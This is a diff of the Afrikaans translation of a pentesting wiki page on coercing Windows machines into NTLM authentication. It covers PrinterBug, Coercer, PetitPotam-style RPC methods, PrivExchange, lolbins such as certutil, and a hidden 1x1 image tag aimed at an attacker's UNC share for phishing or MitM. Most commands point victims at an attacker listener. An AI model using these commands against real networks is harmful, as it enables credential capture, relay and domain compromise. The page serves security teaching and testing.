@@ -1,28 +1,28 @@
-# Dwing NTLM Privileged Authentication af
+# Force NTLM Privileged Authentication
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ## SharpSystemTriggers
 
-[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) is 'n **versameling** van **remote authentication triggers** wat in C# gekodeer is deur die MIDL compiler te gebruik om 3rd party dependencies te vermy.
+[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) is ’n **versameling** **remote authentication triggers** wat in C# gekodeer is met behulp van die MIDL compiler om 3rd party dependencies te vermy.
 
 ## Spooler Service Abuse
 
-As die _**Print Spooler**_-diens **enabled** is, kan jy sommige reeds bekende AD credentials gebruik om die Domain Controller se print server te **versoek** om 'n **update** oor nuwe print jobs te stuur, en dit eenvoudig te sê om die notification na 'n sekere stelsel **te stuur**.\
-Let daarop dat wanneer die printer die notification na arbitrêre stelsels stuur, dit teen daardie **stelsel moet authenticate**. Daarom kan 'n aanvaller die _**Print Spooler**_-diens teen 'n arbitrêre stelsel laat authenticate, en die diens sal die **computer account** in hierdie authentication gebruik.
+As die _**Print Spooler**_-diens **geaktiveer** is, kan jy sommige reeds bekende AD credentials gebruik om die Domain Controller se print server te **versoek** om ’n **opdatering** oor nuwe print jobs te stuur en dit eenvoudig te beveel om die notification na een of ander stelsel te **stuur**.\
+Let daarop dat wanneer die printer die notification na arbitrêre stelsels stuur, dit teen daardie **stelsel moet authenticate**. Daarom kan ’n aanvaller die _**Print Spooler**_-diens teen ’n arbitrêre stelsel laat authenticate, en die diens sal die **computer account** in hierdie authentication **gebruik**.
 
-Onder die enjinkap misbruik die klassieke **PrinterBug** primitive **`RpcRemoteFindFirstPrinterChangeNotificationEx`** oor **`\\PIPE\\spoolss`**. Die aanvaller open eers 'n printer/server handle en verskaf dan 'n fake client name in `pszLocalMachine`, sodat die target spooler 'n notification channel **terug na die aanvaller-beheerde host** skep. Daarom is die effek **outbound authentication coercion** eerder as direkte code execution.<sup>[[2]](#references)</sup>\
+Onder die enjinkap misbruik die klassieke **PrinterBug** primitive **`RpcRemoteFindFirstPrinterChangeNotificationEx`** oor **`\\PIPE\\spoolss`**. Die aanvaller maak eers ’n printer/server handle oop en verskaf dan ’n vals client name in `pszLocalMachine`, sodat die target spooler ’n notification channel **terug na die aanvaller-beheerde host** skep. Dit is waarom die effek **outbound authentication coercion** eerder as direkte code execution is.<sup>[[2]](#references)</sup>\
 As jy op soek is na **RCE/LPE** in die spooler self, kyk na [PrintNightmare](printnightmare.md). Hierdie bladsy fokus op **coercion en relay**.
 
-### Windows Servers op die domein vind
+### Vind Windows Servers op die domain
 
-Gebruik PowerShell om 'n lys van Windows boxes te kry. Servers is gewoonlik prioriteit, so laat ons daar fokus:
+Gebruik PowerShell om Windows hosts te lys. Servers is gewoonlik die hoogste-prioriteit teikens, so fokus eers daarop:
 ```bash
 Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
 ```
-### Soek na Spooler-dienste wat luister
+### Vind Spooler-dienste wat luister
 
-Gebruik 'n effens gewysigde weergawe van @mysmartlogin (Vincent Le Toux) se [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) om te kyk of die Spooler Service luister:
+Gebruik 'n effens aangepaste weergawe van @mysmartlogin (Vincent Le Toux) se [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) om te kyk of die Spooler Service luister:
 ```bash
 . .\Get-SpoolStatus.ps1
 ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
@@ -35,16 +35,16 @@ Of toets vinnig gashere vanaf Linux met **NetExec/CrackMapExec**:
 ```bash
 nxc smb targets.txt -u user -p password -M spooler
 ```
-As jy **coercion surfaces** wil enumerate eerder as om net te kyk of die spooler-endpoint bestaan, gebruik **Coercer scan mode**:<sup>[[5]](#references)</sup>
+As jy coercion surfaces wil enumerate in plaas daarvan om net te kontroleer of die spooler endpoint bestaan, gebruik **Coercer scan mode**:<sup>[[5]](#references)</sup>
 ```bash
 coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
 coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
 ```
-Dit is nuttig, want om die endpoint in EPM te sien, sê slegs vir jou dat die print RPC interface geregistreer is. Dit **waarborg nie** dat elke coercion method met jou huidige privileges bereikbaar is, of dat die host 'n bruikbare authentication flow sal uitstuur nie.
+Dit is nuttig omdat die sien van die endpoint in EPM jou slegs vertel dat die print RPC interface geregistreer is. Dit **waarborg nie** dat elke coercion-metode bereikbaar is met jou huidige privileges nie, of dat die host ’n bruikbare authentication flow sal genereer nie.
 
-### Vra die diens om teen 'n arbitrêre host te authenticate
+### Vra die diens om teen ’n arbitrêre host te authenticate
 
-Jy kan [SpoolSample van hier af](https://github.com/NotMedic/NetNTLMtoSilverTicket) kompileer.
+Jy kan [SpoolSample van hier af](https://github.com/NotMedic/NetNTLMtoSilverTicket) compileer.
 ```bash
 SpoolSample.exe <TARGET> <RESPONDERIP>
 ```
@@ -58,27 +58,27 @@ Met **Coercer** kan jy die spooler-koppelvlakke direk teiken en vermy om te raai
 coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
 coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
 ```
-### Forseer HTTP in plaas van SMB met WebClient
+### Dwing HTTP in plaas van SMB met WebClient
 
-Classic PrinterBug lewer gewoonlik **SMB**-authentication aan `\\attacker\share`, wat steeds nuttig is vir **capture**, **relay na HTTP-teikens** of **relay waar SMB signing ontbreek**.\
-In moderne omgewings word **SMB na SMB**-relaying egter dikwels deur **SMB signing** geblokkeer, dus verkies operators dikwels om eerder **HTTP/WebDAV**-authentication af te dwing.
+Classic PrinterBug lewer gewoonlik **SMB**-authentication na `\\attacker\share`, wat steeds nuttig is vir **capture**, **relay to HTTP targets** of **relay waar SMB signing afwesig is**.\
+In moderne omgewings word relaying **SMB to SMB** egter dikwels deur **SMB signing** geblokkeer, daarom verkies operateurs dikwels om eerder **HTTP/WebDAV**-authentication af te dwing.
 
-As die teiken die **WebClient**-diens het wat loop, kan die listener gespesifiseer word in ’n vorm wat maak dat Windows **WebDAV oor HTTP** gebruik:
+As die teiken die **WebClient**-diens gebruik, kan die listener gespesifiseer word op ’n manier wat Windows **WebDAV over HTTP** laat gebruik:
 ```bash
 printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
 coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
 ```
-Dit is veral nuttig wanneer dit gekombineer word met **`ntlmrelayx --adcs`** of ander HTTP relay-teikens, omdat dit vermy om op SMB relayability op die gedwonge verbinding staat te maak. Die belangrike voorbehoud is dat **WebClient moet loop** op die slagoffer vir die HTTP/WebDAV-variant om te werk.
+Dit is veral nuttig wanneer dit saam met **`ntlmrelayx --adcs`** of ander HTTP relay-teikens gebruik word, omdat dit voorkom dat daar op SMB relayability op die gedwonge verbinding staatgemaak word. Die belangrike beperking is dat **WebClient op die slagoffer moet loop** vir die HTTP/WebDAV-variant om te werk.
 
-### Kombinasie met Unconstrained Delegation
+### Combining with Unconstrained Delegation
 
-As ’n aanvaller reeds ’n rekenaar met [Unconstrained Delegation](unconstrained-delegation.md) gekompromitteer het, kan die aanvaller **die printer laat authenticate teen hierdie rekenaar**. As gevolg van unconstrained delegation sal die **TGT** van die **computer account van die printer** **gestoor word in** die **memory** van die rekenaar met unconstrained delegation. Omdat die aanvaller reeds hierdie host gekompromitteer het, sal hy hierdie **ticket kan retrieve** en dit misbruik ([Pass the Ticket](pass-the-ticket.md)).
+As 'n aanvaller 'n rekenaar wat vir [Unconstrained Delegation](unconstrained-delegation.md) gekonfigureer is, gekompromitteer het, kan hulle **die printer dwing om by daardie rekenaar te authenticate**. Die printer-rekenaarrekening se **TGT** word dan in memory op die unconstrained-delegation-host gecache, waar die aanvaller dit met [Pass the Ticket](pass-the-ticket.md) kan retrieve en hergebruik.
 
 ## RPC Force authentication
 
 [Coercer](https://github.com/p0dalirius/Coercer)<sup>[[5]](#references)</sup>
 
-### RPC UNC-path coercion matrix (interfaces/opnums that trigger outbound auth)
+### RPC UNC-path coercion-matriks (interfaces/opnums wat outbound authentication trigger)
 - MS-RPRN (Print System Remote Protocol)
 - Pipe: \\PIPE\\spoolss
 - IF UUID: 12345678-1234-abcd-ef00-0123456789ab
@@ -87,11 +87,11 @@ As ’n aanvaller reeds ’n rekenaar met [Unconstrained Delegation](unconstrain
 - MS-PAR (Print System Asynchronous Remote)
 - Pipe: \\PIPE\\spoolss
 - IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
-- Notes: asynchronous print interface on the same spooler pipe; use Coercer to enumerate reachable methods on a given host<sup>[[1]](#references)[[6]](#references)</sup>
+- Notes: asynchronous print-interface op dieselfde spooler-pipe; gebruik Coercer om bereikbare methods op 'n gegewe host te enumerate<sup>[[1]](#references)[[6]](#references)</sup>
 - MS-EFSR (Encrypting File System Remote Protocol)
-- Pipes: \\PIPE\\efsrpc (also via \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
+- Pipes: \\PIPE\\efsrpc (ook via \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
 - IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
-- Opnums commonly abused: 0, 4, 5, 6, 7, 12, 13, 15, 16
+- Opnums wat algemeen misbruik word: 0, 4, 5, 6, 7, 12, 13, 15, 16
 - Tool: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
 - MS-DFSNM (DFS Namespace Management)
 - Pipe: \\PIPE\\netdfs
@@ -109,24 +109,24 @@ As ’n aanvaller reeds ’n rekenaar met [Unconstrained Delegation](unconstrain
 - Opnum: 9 ElfrOpenBELW
 - Tool: CheeseOunce<sup>[[1]](#references)</sup>
 
-Nota: Hierdie metodes aanvaar parameters wat ’n UNC path kan bevat (byvoorbeeld, `\\attacker\share`). Wanneer dit verwerk word, sal Windows authenticate (machine/user context) teen daardie UNC, wat NetNTLM capture of relay moontlik maak.\
-Vir spooler abuse bly **MS-RPRN opnum 65** die mees algemene en bes gedokumenteerde primitive, omdat die protokolspesifikasie uitdruklik bepaal dat die server ’n notification channel terug na die client skep wat deur `pszLocalMachine` gespesifiseer word.<sup>[[2]](#references)</sup>
+Nota: Hierdie methods aanvaar parameters wat 'n UNC path kan bevat (byvoorbeeld, `\\attacker\share`). Wanneer dit verwerk word, sal Windows met die machine/user-context by daardie UNC authenticate, wat NetNTLM capture of relay moontlik maak.\
+Vir spooler abuse bly **MS-RPRN opnum 65** die algemeenste en bes gedokumenteerde primitive, omdat die protocol specification uitdruklik verklaar dat die server 'n notification channel terug na die client wat deur `pszLocalMachine` gespesifiseer word, skep.<sup>[[2]](#references)</sup>
 
 ### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
 - Interface: MS-EVEN oor \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
 - Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
-- Effect: die target probeer om die verskafde backup log path oop te maak en authenticate teen die attacker-controlled UNC.<sup>[[1]](#references)</sup>
-- Practical use: dwing Tier 0-assets (DC/RODC/Citrix/etc.) om NetNTLM uit te stuur, en relay dit dan na AD CS-endpoints (ESC8/ESC11-scenario’s) of ander privileged services.<sup>[[1]](#references)</sup>
+- Effect: die target probeer om die verskafde backup-log path oop te maak en authenticate by die attacker-beheerde UNC.<sup>[[1]](#references)</sup>
+- Praktiese gebruik: dwing Tier 0-assets (DC/RODC/Citrix/etc.) om NetNTLM uit te stuur, en relay dit dan na AD CS-endpoints (ESC8/ESC11-scenarios) of ander privileged services.<sup>[[1]](#references)</sup>
 
 ## PrivExchange
 
-Die `PrivExchange`-attack is die gevolg van ’n fout in die **Exchange Server `PushSubscription`-feature**. Hierdie feature laat toe dat die Exchange-server deur enige domain user met ’n mailbox gedwing word om oor HTTP teen enige client-provided host te authenticate.
+Die `PrivExchange`-attack is die gevolg van 'n flaw wat in die **Exchange Server se `PushSubscription`-feature** gevind is. Hierdie feature laat toe dat die Exchange-server deur enige domain user met 'n mailbox gedwing word om oor HTTP by enige client-provided host te authenticate.
 
-By verstek loop die **Exchange-service as SYSTEM** en kry dit excessive privileges (spesifiek, dit het **WriteDacl privileges op die domain pre-2019 Cumulative Update**). Hierdie fout kan uitgebuit word om die **relaying van information na LDAP** moontlik te maak en vervolgens die domain NTDS-database te **extract**. In gevalle waar relaying na LDAP nie moontlik is nie, kan hierdie fout steeds gebruik word om na ander hosts binne die domain te relay en daarteen te authenticate. Suksesvolle exploitation van hierdie attack gee onmiddellike toegang tot die Domain Admin met enige authenticated domain user account.
+By verstek loop die **Exchange-service as SYSTEM** en het dit excessive privileges (spesifiek **WriteDacl privileges op die domain voor die 2019 Cumulative Update**). Hierdie flaw kan uitgebuit word om die **relaying van information na LDAP moontlik te maak en daarna die domain NTDS-database te extract**. In gevalle waar relaying na LDAP nie moontlik is nie, kan hierdie flaw steeds gebruik word om na ander hosts binne die domain te relay en daar te authenticate. Suksesvolle exploitation van hierdie attack verleen immediate access tot die Domain Admin met enige authenticated domain user-account.
 
 ## Inside Windows
 
-As jy reeds binne die Windows-machine is, kan jy Windows dwing om met privileged accounts aan ’n server te connect met:
+As jy reeds binne die Windows-machine is, kan jy Windows dwing om met privileged accounts aan 'n server te connect met:
 
 ### Defender MpCmdRun
 ```bash
@@ -151,7 +151,7 @@ Of gebruik hierdie ander tegniek: [https://github.com/p0dalirius/MSSQL-Analysis-
 
 ### Certutil
 
-Dit is moontlik om certutil.exe lolbin (Microsoft-ondertekende binêre lêer) te gebruik om NTLM-authentication af te dwing:
+Dit is moontlik om certutil.exe lolbin (Microsoft-ondertekende binêre lêer) te gebruik om NTLM-verifikasie af te dwing:
 ```bash
 certutil.exe -syncwithWU  \\127.0.0.1\share
 ```
@@ -159,40 +159,39 @@ certutil.exe -syncwithWU  \\127.0.0.1\share
 
 ### Via e-pos
 
-As jy die **e-posadres** ken van die gebruiker wat by ’n masjien aanmeld wat jy wil kompromitteer, kan jy eenvoudig vir hom ’n **e-pos met ’n 1x1-prent** stuur, soos
+As jy die **e-posadres** ken van die gebruiker wat by ’n masjien aanmeld wat jy wil kompromitteer, kan jy eenvoudig vir hom ’n **e-pos met ’n 1x1-prent** stuur, soos..
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
-en wanneer hy dit oopmaak, sal hy probeer om te authenticate.
+Wanneer die slagoffer dit oopmaak, probeer Windows om te authenticate.
 
 ### MitM
 
-As jy ’n MitM-aanval op ’n rekenaar kan uitvoer en HTML in ’n bladsy kan inject wat hy sal sien, kan jy probeer om ’n prent soos die volgende in die bladsy te inject:
+As jy 'n MitM-aanval kan uitvoer en HTML in 'n bladsy wat deur die slagoffer bekyk word kan invoeg, probeer om 'n prent soos die volgende in te voeg:
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
-## Ander maniere om NTLM authentication af te dwing en te phish
+## Ander maniere om NTLM-authentication af te dwing en te phish
 
 
 {{#ref}}
 ../ntlm/places-to-steal-ntlm-creds.md
 {{#endref}}
 
-## NTLMv1 crack
+## NTLMv1 kraak
 
-As jy [NTLMv1 challenges kan capture, lees hier hoe om dit te crack](../ntlm/index.html#ntlmv1-attack).\
-_Onthou dat jy, om NTLMv1 te crack, Responder challenge op "1122334455667788" moet stel_
+As jy [NTLMv1 challenges kan vaslê, lees hier hoe om hulle te kraak](../ntlm/index.html#ntlmv1-attack).\
+_Onthou dat jy Responder se challenge op "1122334455667788" moet stel om NTLMv1 te kraak_
 
-## Verwysings
+## References
 
-- [1] [Unit 42 – Authentication Coercion Keeps Evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)
+- [1] [Unit 42 – Authentication Coercion hou aan ontwikkel](https://unit42.paloaltonetworks.com/authentication-coercion/)
 - [2] [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
-- [3] [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
+- [3] [Microsoft – MS-EVEN: EventLog-afstandsprotokol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
 - [4] [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
 - [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
 - [6] [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
 - [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
 - [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
 - [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)
-
 {{#include ../../banners/hacktricks-training.md}}
